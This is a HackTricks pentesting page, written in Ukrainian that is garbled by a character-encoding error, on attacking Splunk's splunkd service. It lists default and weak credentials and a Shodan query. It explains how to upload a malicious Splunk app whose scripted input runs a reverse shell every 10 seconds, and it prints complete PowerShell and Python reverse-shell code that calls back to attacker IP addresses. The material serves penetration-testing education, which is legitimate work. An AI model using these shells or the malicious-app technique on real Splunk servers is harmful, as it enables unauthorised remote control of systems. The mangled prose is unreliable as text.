# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

* –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∞–Ω–∞–ª—ñ—Ç–∏–∫–∏ –∂—É—Ä–Ω–∞–ª—ñ–≤, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–±–æ—Ä—É, –∞–Ω–∞–ª—ñ–∑—É —Ç–∞ –≤—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö
* –ó–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –±—ñ–∑–Ω–µ—Å-–∞–Ω–∞–ª—ñ—Ç–∏—Ü—ñ
* –ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:
* –í–µ–±-—Å–µ—Ä–≤–µ—Ä: 8000
* –°–ª—É–∂–±–∞ Splunkd: 8089

### –í–µ–∫—Ç–æ—Ä–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ:

1. –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó

* –ü—Ä–æ–±–Ω–∞ –≤–µ—Ä—Å—ñ—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω—É –≤–µ—Ä—Å—ñ—é –ø—ñ—Å–ª—è 60 –¥–Ω—ñ–≤
* –ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∞ –≤–µ—Ä—Å—ñ—è –Ω–µ –º–∞—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó
* –ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π —Ä–∏–∑–∏–∫ –±–µ–∑–ø–µ–∫–∏, —è–∫—â–æ –Ω–µ —É–ø—Ä–∞–≤–ª—è—Ç–∏
* –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –Ω–µ –ø–æ–º—ñ—Ç–∏—Ç–∏ –Ω–∞—Å–ª—ñ–¥–∫–∏ –¥–ª—è –±–µ–∑–ø–µ–∫–∏

2. –°–ª–∞–±–∫—ñ –º—ñ—Å—Ü—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

* –°—Ç–∞—Ä—ñ –≤–µ—Ä—Å—ñ—ó: —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ `admin:changeme`
* –ù–æ–≤—ñ –≤–µ—Ä—Å—ñ—ó: –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—ó
* –ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–ª–∞–±–∫–∏—Ö –ø–∞—Ä–æ–ª—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `admin`, `Welcome`, `Password123`)

3. –ú–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É

* –ö—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É:
* –°–µ—Ä–≤–µ—Ä–Ω—ñ –¥–æ–¥–∞—Ç–∫–∏ Django
* REST-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏
* –°–∫—Ä–∏–ø—Ç–æ–≤—ñ –≤–≤–µ–¥–µ–Ω–Ω—è
* –°–∫—Ä–∏–ø—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω—å
* –ü—ñ–¥—Ç—Ä–∏–º–∫–∞ –∫—Ä–æ—Å-–ø–ª–∞—Ç—Ñ–æ—Ä–º (Windows/Linux)
* –°–∫—Ä–∏–ø—Ç–æ–≤—ñ –≤–≤–µ–¥–µ–Ω–Ω—è –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏:
* Bash-—Å–∫—Ä–∏–ø—Ç–∏
* PowerShell-—Å–∫—Ä–∏–ø—Ç–∏
* –ü–∞–∫–µ—Ç–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏

–ö–ª—é—á–æ–≤–∏–π –ø–æ—Ç–µ–Ω—Ü—ñ–∞–ª –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:

* –ó–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —á—É—Ç–ª–∏–≤–∏—Ö –¥–∞–Ω–∏—Ö
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤ –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω—ñ–π –≤–µ—Ä—Å—ñ—ó
* –ö—ñ–ª—å–∫–∞ –≤–µ–∫—Ç–æ—Ä—ñ–≤ –¥–ª—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É
* –ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–æ–≤–∏—Ö –≤–≤–µ–¥–µ–Ω—å –¥–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó —Å–∏—Å—Ç–µ–º–∏

### Shodan

* `Splunk build`

## RCE

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É

Splunk –ø—Ä–æ–ø–æ–Ω—É—î —Å–∫–ª–∞–¥–Ω–∏–π –º–µ—Ç–æ–¥ –¥–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–≤–æ—ó –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –∫—Ä–æ—Å-–ø–ª–∞—Ç—Ñ–æ—Ä–º–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É–≤–∞–Ω–Ω—è. –û—Å–Ω–æ–≤–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –ø–æ–ª—è–≥–∞—î –≤ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É, —è–∫–∏–π –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Ä–µ–≤–µ—Ä—Å–Ω—ñ –æ–±–æ–ª–æ–Ω–∫–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º–∞—Ö Windows —ñ Linux.

–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫ –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ **Python, Batch, Bash –∞–±–æ PowerShell —Å–∫—Ä–∏–ø—Ç–∏**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, **Splunk –ø–æ—Å—Ç–∞—á–∞—î—Ç—å—Å—è –∑ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º Python**, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å –Ω–∞ **Windows** —Å–∏—Å—Ç–µ–º–∞—Ö –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥ python.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**—Ü–µ–π**](https://github.com/0xjpuff/reverse_shell_splunk) –ø—Ä–∏–∫–ª–∞–¥ –∑ **`bin`**, —â–æ –º—ñ—Å—Ç–∏—Ç—å –ø—Ä–∏–∫–ª–∞–¥ –¥–ª—è [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) —Ç–∞ [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). –ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–≤—ñ–π –≤–ª–∞—Å–Ω–∏–π.

–ü—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Å–ª—ñ–¥—É—î –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ–π –º–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—ó –Ω–∞ –≤—Å—ñ—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
–ö—Ä–∏—Ç–∏—á–Ω–∏–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª `inputs.conf` –∞–∫—Ç–∏–≤—É—î —Å–∫—Ä–∏–ø—Ç —à–ª—è—Ö–æ–º:

* –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è `disabled = 0`
* –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —ñ–Ω—Ç–µ—Ä–≤–∞–ª—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤ 10 —Å–µ–∫—É–Ω–¥
* –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–ø—É –¥–∂–µ—Ä–µ–ª–∞ —Å–∫—Ä–∏–ø—Ç–∞

–†–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è —î –ø—Ä–æ—Å—Ç–∏–º:

1. –°—Ç–≤–æ—Ä—ñ—Ç—å —à–∫—ñ–¥–ª–∏–≤–∏–π –ø–∞–∫–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–∏
2. –ù–∞–ª–∞—à—Ç—É–π—Ç–µ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—á (Netcat/socat) –Ω–∞ –∞—Ç–∞–∫—É—é—á—ñ–π –º–∞—à–∏–Ω—ñ
3. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø—Ä–æ–≥—Ä–∞–º—É —á–µ—Ä–µ–∑ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å Splunk
4. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞ –ø—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è

–ü—Ä–∏–∫–ª–∞–¥ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª—É Windows PowerShell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
–ü—Ä–∏–∫–ª–∞–¥ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª–ª—É Python –¥–ª—è Linux:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

–ù–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø–æ—è—Å–Ω–µ–Ω–Ω—è, —è–∫ —Ü–µ–π —Å–µ—Ä–≤—ñ—Å –º–æ–∂–µ –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏—Ç–æ –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Å—Ç—ñ–π–∫–æ—Å—Ç—ñ:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
